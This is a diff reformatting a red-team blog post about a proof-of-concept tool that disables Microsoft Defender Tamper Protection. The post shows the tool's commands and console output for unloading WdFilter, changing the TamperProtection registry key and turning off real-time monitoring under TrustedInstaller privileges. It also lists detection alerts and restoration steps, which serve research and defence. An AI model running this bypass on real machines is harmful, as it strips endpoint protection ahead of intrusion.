@@ -208,48 +208,48 @@ An example, to use this POC is as follows:
 
 1. Unload WdFilter:
 
-```
-C:\Users\User\Desktop> .\Disable-TamperProtection.exe 1
-[+] WdFilter Altitude Registry key Value: (null)
-[+] Trusted Installer handle: 0000000000000120
-[!] Spawning registry with TrustedInstaller privileges to delete WdFilter "Altitude" regkey.
-[+] Created process ID: 4192 and assigned additional token privileges.
-[+] Execute option 1 to validate!
+        ```
+        C:\Users\User\Desktop> .\Disable-TamperProtection.exe 1
+        [+] WdFilter Altitude Registry key Value: (null)
+        [+] Trusted Installer handle: 0000000000000120
+        [!] Spawning registry with TrustedInstaller privileges to delete WdFilter "Altitude" regkey.
+        [+] Created process ID: 4192 and assigned additional token privileges.
+        [+] Execute option 1 to validate!
 
-C:\Users\User\Desktop>.\Disable-TamperProtection.exe 1
-[+] WdFilter Altitude Registry key has been successfully deleted.
-[+] Enumerating WdFilter information:
-        Next:   0 | Frame ID:   0 | No. of Instances:   4 | Name:        wdfilter | Altitude:          328010
-[+] Restart the system or wait a few minutes for WdFilter to unload.
-[+] Execute option 1 to validate!
+        C:\Users\User\Desktop>.\Disable-TamperProtection.exe 1
+        [+] WdFilter Altitude Registry key has been successfully deleted.
+        [+] Enumerating WdFilter information:
+                Next:   0 | Frame ID:   0 | No. of Instances:   4 | Name:        wdfilter | Altitude:          328010
+        [+] Restart the system or wait a few minutes for WdFilter to unload.
+        [+] Execute option 1 to validate!
 
-# Restart or wait a few minutes for WdFilter to automatically unload
-C:\Users\User\Desktop>.\Disable-TamperProtection.exe 1
-[+] WdFilter Altitude Registry key has been successfully deleted.
-[+] WDFilter has been successfully unloaded, use option 2 to disable Tamper Protection.
-```
+        # Restart or wait a few minutes for WdFilter to automatically unload
+        C:\Users\User\Desktop>.\Disable-TamperProtection.exe 1
+        [+] WdFilter Altitude Registry key has been successfully deleted.
+        [+] WDFilter has been successfully unloaded, use option 2 to disable Tamper Protection.
+        ```
 
 2. Disable Tamper Protection:
 
-```
-C:\Users\User\Desktop>.\Disable-TamperProtection.exe 2
-[+] WdFilter Altitude Registry key has been successfully deleted.
-[+] Trusted Installer handle: 00000000000000C4
-[!] Spawning registry with TrustedInstaller privileges to alter Defender "TamperProtection" regkey from 5 to 4.
-[+] Created process ID: 7748 and assigned additional token privileges.
-[+] Use option '3' to finally Disable AV/MDE.
-```
+        ```
+        C:\Users\User\Desktop>.\Disable-TamperProtection.exe 2
+        [+] WdFilter Altitude Registry key has been successfully deleted.
+        [+] Trusted Installer handle: 00000000000000C4
+        [!] Spawning registry with TrustedInstaller privileges to alter Defender "TamperProtection" regkey from 5 to 4.
+        [+] Created process ID: 7748 and assigned additional token privileges.
+        [+] Use option '3' to finally Disable AV/MDE.
+        ```
 
 3. Disable Defender / MDE:
 
-```
-C:\Users\User\Desktop>.\Disable-TamperProtection.exe 3
-[+] WdFilter Altitude Registry key has been successfully deleted.
-[+] Trusted Installer handle: 000000000000011C
-[!] Spawning registry with TrustedInstaller privileges to Disable 'RealtimeMonitoring' regkey.
-[+] To disable other components of defender check source.
-[+] Created process ID: 8040 and assigned additional token privileges.
-```
+        ```
+        C:\Users\User\Desktop>.\Disable-TamperProtection.exe 3
+        [+] WdFilter Altitude Registry key has been successfully deleted.
+        [+] Trusted Installer handle: 000000000000011C
+        [!] Spawning registry with TrustedInstaller privileges to Disable 'RealtimeMonitoring' regkey.
+        [+] To disable other components of defender check source.
+        [+] Created process ID: 8040 and assigned additional token privileges.
+        ```
 
 *NOTE: Even though Tamper Protection is effectively disabled now, it takes a reboot to render the same change in the "Security Settings" GUI Prompt.*
 
@@ -291,13 +291,13 @@ Testing the exploit POC against a target Windows machine (Server 2022, Win10 and
 Alerts and detections can be used to build basic telemetry and detections for this attack.
 Testing the POC with latest Windows Defender Signatures as of this writing resulted in no detections. Testing the POC with MDE enabled results in whitelisted execution with the following alerts raised.
 
-- Alert 1: Suspicious process reparenting detected: This alert is generated when a process is spawned under TrustedInstaller to gain its privileges.
+**Alert 1:** Suspicious process reparenting detected: This alert is generated when a process is spawned under TrustedInstaller to gain its privileges.
 
 ![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Bypass-Tamper-Protection/Images/Pasted%20image%2020231211123832.png)
 
 ![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Bypass-Tamper-Protection/Images/Pasted%20image%2020231211123417.png)
 
-- Alert 2: Tampering with Microsoft Defender for Endpoint sensor settings: This alert is generated upon deletion of the WdFilter Altitude regkey.
+**Alert 2:** Tampering with Microsoft Defender for Endpoint sensor settings: This alert is generated upon deletion of the WdFilter Altitude regkey.
 
 ![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Bypass-Tamper-Protection/Images/Pasted%20image%2020231211123519.png)
 
@@ -345,6 +345,7 @@ PS C:\Users\Administrator> Set-MpPreference -DisableIOAVProtection $false
 ```
 
 The Proof of Concept (POC) incorporates functionality to reinstate the WdFilter minidriver, Tamper Protection and Defender settings based on this concept.
+
 ![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Bypass-Tamper-Protection/Images/Pasted%20image%2020221124191854.png)
 
 ## Remediation
